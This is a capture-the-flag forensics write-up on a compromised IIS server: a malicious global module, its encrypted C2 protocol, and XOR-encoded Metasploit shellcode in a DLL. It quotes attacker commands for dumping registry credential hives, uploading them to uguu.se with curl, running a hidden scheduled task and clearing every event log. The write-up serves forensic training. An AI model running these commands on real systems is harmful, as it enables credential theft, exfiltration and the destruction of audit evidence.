# Stone of the Wise (Open Wound) — Writeup

**Event:** HTB Global Cyber Skills Benchmark 2026 — Project Nightfall
**Category:** Forensics (Hard)
**Flag:** `HTB{D1rty_IIS_n4t1v3_m0dul3_0n_7hE_l04D}`

---

## Going in

If you haven't done an IIS-persistence challenge before:

- **IIS global modules.** Native C++ DLLs loaded by IIS into every `w3wp.exe` worker process. They get to inspect/modify every HTTP request that hits the server. Persistence by registering one is *almost invisible* to standard process forensics because the code runs *as* IIS, not as a separate process.
- **applicationHost.config.** The big XML file in `C:\Windows\System32\inetsrv\config\` that registers global modules and sites. Source of truth for what IIS is loading.
- **GPG.** Public-key crypto. To decrypt a `.gpg` file you need the matching private key *and* the passphrase used to protect that key. Private keys live under `%APPDATA%\gnupg\private-keys-v1.d\`.
- **msfvenom XOR-encoder.** A common Metasploit payload encoder. It emits a stub that XORs an encrypted blob back to plaintext at runtime. The stub has a *very* recognisable shape.
- **Process-hollowing imports.** `CreateProcessA` + `WriteProcessMemory` + `GetThreadContext` + `SetThreadContext` + `VirtualAllocEx` + `ResumeThread`. If a binary imports that set, it claims to be doing process hollowing.

The flag is split into two halves, hidden by *completely different* techniques on two different artifacts. The pivot between them is one shared string.

---

## The shape of the solve

| Half | Where it lives | How it's hidden |
|---|---|---|
| `HTB{D1rty_IIS_n4t1v` | Decrypted `StyleNet_Retail_Network_Design.docx` | Plaintext red text on page 2 |
| `3_m0dul3_0n_7hE_l04D}` | `Scdaemon.dll` (in `iisupdate.zip`) | XOR-encoded shellcode → `net user` password argument |

The key pivot: the *username* the attacker creates on the system (`webadmin`) is also the *passphrase* to decrypt the docx. Same string, two roles.

---

## Part 1 — Persistence and the C2 protocol

### Identifying the persistence

The IIS application host configuration on the AD1 image shows a registered global module that doesn't belong:

```xml
applicationHost.config → <globalModules>
  ...
  <add name="RewriterModule"
       image="%windir%\System32\inetsrv\RewriterModule.dll" />
```

`RewriterModule.dll` is a native IIS module that intercepts every HTTP request. Loaded into every `w3wp.exe` by IIS itself — nearly invisible to standard process listing. The module looks for an encrypted command channel inside what otherwise look like ordinary HTTP requests to the maintenance page.

### The C2 protocol

Reversing the module's request handler plus the pcap reveals the protocol. Every C2 message is AES-encrypted and base64-encoded inside HTTP headers/bodies. Decrypted, the layout is a 24-byte header + payload:

| Offset | Field |
|---|---|
| 0 | Command code |
| 1–7 | Reserved (zero) |
| 8–11 | Payload length (LE u32) |
| 12–15 | Misc length (LE u32) |
| 16–19 | Total length (LE u32) |
| 20–23 | Path/name length (LE u32) |
| 24+ | Payload |

Observed command codes:

| Code | Direction | Purpose |
|---|---|---|
| `0x0e` | op → agent | Execute shell command |
| `0x1b` | agent → op | Command output |
| `0x06` | op → agent | Open file upload session |
| `0x07` | op → agent | File chunk (4 KB per chunk) |
| `0x13` | agent → op | Session init ACK with token |
| `0x14` | agent → op | Per-chunk upload ACK |
| `0x01` | agent → op | Empty/heartbeat ACK |

### Operator playbook (decrypted in order)

1. **Reconnaissance** — `qwinsta`, `Get-Service`, `Get-WebConfiguration`, `Get-WebGlobalModule`, directory listings of `Desktop` and `Documents`. Confirms this is a staging server and reveals `StyleNet_Retail_Network_Design.docx.gpg` in Administrator's Documents.
2. **GPG attempt fails** — `gpg --list-secret-keys` shows no keys, then a decrypt attempt fails with `encrypted with RSA key, ID 8D0278CD85D41887`. Operator doesn't have the private key on *this* machine.
3. **Credential harvesting** — `reg save HKLM\sam`, `HKLM\system`, `HKLM\security` to `%TEMP%`, then 7-Zip them into `sam.zip` (hives are in use, so first reg-save them, then zip the saved copies).
4. **Exfil to uguu.se** — `curl -F "files[]=@$env:temp\sam.zip" https://uguu.se/upload`. First attempt rejected (415 Filetype), so they add a "BYPASS" header and upload each hive individually.
5. **Tool drop** — `iisupdate.zip` uploaded to `C:\Windows\TEMP\` over 17 chunks of `cmd=0x07`, then extracted with 7-Zip.
6. **Event-log destruction** — `phant0m.exe` (Halil Dalabasmaz's tool, v2.0 from the banner), which *suspends the Windows Event Log service threads by PID* rather than killing the service. Avoids generating a service-stop event in the logs.
7. **Privilege escalation** — created a scheduled task `RunAsAdmin` running `powershell -NoP -W Hidden -File $env:temp\iisupdate\Admin.ps1` as Administrator, then `schtasks /run`.
8. **Process hollowing** — `regsvr32.exe /s $env:temp\iisupdate\Scdaemon.dll`.
9. **Cleanup** — a clumsy series of `rm -force`, `rm -f`, even a typo'd `rf -force -y` before settling on `Remove-Item -Path "$env:TEMP\iisupdate" -Recurse -Force`. Also deletes the sam dumps, the IIS LogFiles directory, and notably `C:\Users\Administrator\AppData\Local\Temp\Draft.txt` (28,924 bytes) — a file that didn't belong to any of the staging tools.
10. **Final wipe** — `wevtutil el | ForEach-Object { wevtutil cl $_ }` clears every Windows event log.

### Reconstructing `iisupdate.zip` from the pcap

Each `cmd=0x07` upload chunk: 24-byte header + filename + 4 KB of payload. Reassemble by offset:

```python
chunks = {}
for msg in c2_messages:
    if msg.cmd != 0x07: continue
    offset = int.from_bytes(msg.data[12:16], 'little')
    fn_len = int.from_bytes(msg.data[20:24], 'little')
    chunks[offset] = msg.data[24+fn_len:]

with open('iisupdate.zip','wb') as f:
    for off in sorted(chunks):
        f.seek(off); f.write(chunks[off])
```

Contents:

```
Admin.ps1        1,350 bytes   — base64 PowerShell reverse shell → 192.168.91.1:4444
phant0m.exe    131,584 bytes   — public event-log thread killer
Scdaemon.dll     8,704 bytes   — the interesting one
```

---

## Part 2 — Recovering the first half

### Pivoting from C2 to the docx

The C2 log contained a `net user` listing local accounts:

```
Administrator   Guest   webadmin
```

`webadmin` is not a standard Windows account. Attacker-created. That name becomes the working hypothesis for the GPG passphrase.

### Recovering the GPG private key

The encrypting key ID was `8D0278CD85D41887` — its private half has to be on disk somewhere:

```bash
find /mnt/image -path '*/gnupg/*' -type f
# .../AppData/Roaming/gnupg/pubring.kbx
# .../AppData/Roaming/gnupg/private-keys-v1.d/*.key
```

### Decrypt

```bash
mkdir -p /tmp/gpghome && chmod 700 /tmp/gpghome
cp -r .../gnupg/Roaming/* /tmp/gpghome/
chmod 600 /tmp/gpghome/private-keys-v1.d/*

echo "webadmin" | gpg --homedir /tmp/gpghome \
    --batch --passphrase-fd 0 --pinentry-mode loopback \
    -d -o /tmp/decrypted.docx \
    .../StyleNet_Retail_Network_Design.docx.gpg
```

The decrypted document is a StyleNet Retail network design. Bottom of page 2, large red text:

> **HTB{D1rty_IIS_n4t1v**

First half captured.

### A genuine forensic Easter egg

Beyond the visible flag fragment, the docx contains a planted clue. The Web Server's DMZ row reads `192.168.91.174`. Crack the docx as a zip and look at `word/document.xml`:

```bash
unzip /tmp/decrypted.docx -d /tmp/docx_extract/
cat /tmp/docx_extract/word/document.xml
```

That IP is split across four `<w:r>` runs: `192.168.` + `91` + `.1` + `74`. Two of the four fragments (`91` and `74`) carry a unique `w:rsidR="00BE5979"` attribute that doesn't appear on any other run in the table. Every other IP in the table is a single un-split run. The rsid metadata says: this IP was edited in a *separate* Word session from the rest of the document. Matches the brief's "routing data they targeted before the blackout."

---

## Part 3 — Recovering the second half

### Why `Scdaemon.dll` deserved attention

Three flags on this binary:

1. **Imports.** `CreateProcessA`, `WriteProcessMemory`, `GetThreadContext`, `SetThreadContext`, `VirtualAllocEx`, `ResumeThread` — the textbook process-hollowing set.
2. **Size.** 8,704 bytes is way too small for real hollowing logic, which typically runs several KB of code.
3. **Section ratio is inverted.** For a real hollowing DLL you expect a big `.text` and a small `.data`. This one is:

```
.text    807 bytes
.rdata   784 bytes
.data  5,120 bytes   ← bigger than the code
.pdata    48 bytes
```

When `.data` dwarfs `.text`, the binary is a **loader** for something stored as data, not the implementation its imports advertise.

### The encoding stub

Hex dump of `.data`:

```
0x00: 48 31 c9                       xor rcx, rcx
0x03: 48 81 e9 d8 ff ff ff           sub rcx, -0x28
0x0a: 48 8d 05 ef ff ff ff           lea rax, [rip-0x11]
0x11: 48 bb ee 37 bd 82 1f 63 86 73  movabs rbx, KEY
0x1b: 48 31 58 27                    xor [rax+0x27], rbx
0x1f: 48 2d f8 ff ff ff              sub rax, -8
0x25: e2 f4                          loop -0x0c
0x27: <ENCRYPTED PAYLOAD>
```

This is the textbook **`msfvenom --encoder x64/xor`** stub. The pattern is worth memorising:

- `xor rcx,rcx; sub rcx,-N` sets `rcx` to the byte count of the encrypted region
- `lea rax,[rip-0x11]` points `rax` at the start of the stub
- `movabs rbx, KEY` loads the 8-byte XOR key
- `xor [rax+0x27], rbx; rax+=8; loop` decrypts each 8-byte block in place

So the encrypted payload starts at offset `0x27` from the start of `.data`, the key is the 8 bytes at offset `0x13`, and the size is read from the `sub rcx, -size` immediate.

### Decrypt

```python
import pefile
pe = pefile.PE('Scdaemon.dll')
data = next(s for s in pe.sections if s.Name.rstrip(b'\x00') == b'.data').get_data()

neg_size = int.from_bytes(data[3:7], 'little', signed=True)   # sub rcx, -N
size = -neg_size
key  = data[0x13:0x1B]
enc  = data[0x27:0x27 + size]

out = bytearray()
for i in range(0, len(enc), 8):
    block = enc[i:i+8]
    out.extend(bytes(a ^ b for a, b in zip(block, key)))

open('stage2.bin','wb').write(bytes(out))
```

The output starts with `fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 ...` — the famous Metasploit x64 prologue (`cld; and rsp,-0x10; call $+0xc5; push r9; ...`). Standard `WinExec`/Meterpreter-style staged shellcode.

### The flag

`strings` on the decrypted payload finds exactly one interesting line:

```
@0x010b: net user webadmin '3_m0dul3_0n_7hE_l04D}' /add /Y
```

The shellcode `WinExec`'s a `net user` command that creates `webadmin` with password `3_m0dul3_0n_7hE_l04D}`. The "password" is the second half of the flag — the trailing `}` is the giveaway.

---

## Full flag

```
HTB{D1rty_IIS_n4t1v3_m0dul3_0n_7hE_l04D}
```

Reads as "Dirty IIS native module on the load" — the `RewriterModule.dll` registered as a global module in IIS's load order. Which is exactly the persistence mechanism the brief asked about.

---

## How the pieces fit together

The two halves are bound by a circular reference:

- The C2 log shows the attacker created a local user `webadmin`.
- That username, as a **passphrase**, decrypts the docx → first half of the flag.
- That same username, as a **net user argument** inside the encrypted shellcode in `Scdaemon.dll` → password argument is the second half.

Miss the `webadmin` pivot in either direction and the chain breaks.

---

## Layered obfuscation (why this was rated Hard)

The second half is protected by five concentric layers:

1. Disguised as a **password argument** in a `net user` command.
2. Embedded in **WinExec shellcode**.
3. The shellcode is **XOR-encrypted** with a per-binary 8-byte key.
4. The encrypted shellcode lives inside a **fake process-hollowing DLL** that imports the right APIs but doesn't actually use them.
5. The DLL is itself inside a **zip transferred over an encrypted C2 channel** in 4 KB chunks across multiple TCP streams.

Each layer plausibly imitates real tradecraft. The flag is invisible until every layer is peeled back, and disguising the flag content as a *credential argument* — instead of a string literal — defeats simple `grep HTB` against any single layer.

---

## Lessons

- **Persistence in production IIS is hard to find from a process list.** Always check `applicationHost.config` for unfamiliar global modules.
- **Inverted section sizes are a red flag.** `.text` smaller than `.data` on a binary that *claims* to implement complex behavior = loader for something stored as data.
- **Memorise the msfvenom XOR stub.** Once you recognise `xor rcx,rcx; sub rcx,-N; lea rax,[rip-0x11]; movabs rbx,KEY; xor [rax+0x27],rbx; sub rax,-8; loop`, every subsequent encounter is a 5-minute solve.
- **rsid attributes in `word/document.xml`** survive copy-paste and reveal multi-session edits. Useful for "who tampered with this document" questions.
- **One name in two roles.** If the brief mentions a name (account, file, machine) twice in different contexts, suspect it pivots — same string serves as both username on the system and passphrase for an encrypted artifact.

## IoCs

| Type | Value |
|---|---|
| Account | `webadmin` (locally created) |
| File | `C:\Windows\System32\inetsrv\RewriterModule.dll` |
| File | `C:\Windows\TEMP\iisupdate.zip` |
| File | `C:\Windows\TEMP\iisupdate\phant0m.exe` |
| File | `C:\Windows\TEMP\iisupdate\Scdaemon.dll` |
| File | `C:\Windows\TEMP\iisupdate\Admin.ps1` |
| File | `C:\Users\Administrator\AppData\Local\Temp\Draft.txt` (deleted, targeted) |
| Scheduled task | `RunAsAdmin` running `powershell -NoP -W Hidden -File ...\Admin.ps1` |
| Network | TCP `192.168.91.1:4444` (reverse shell) |
| Network | HTTPS `uguu.se` (registry hive exfiltration) |
| GPG key | RSA key ID `8D0278CD85D41887` |
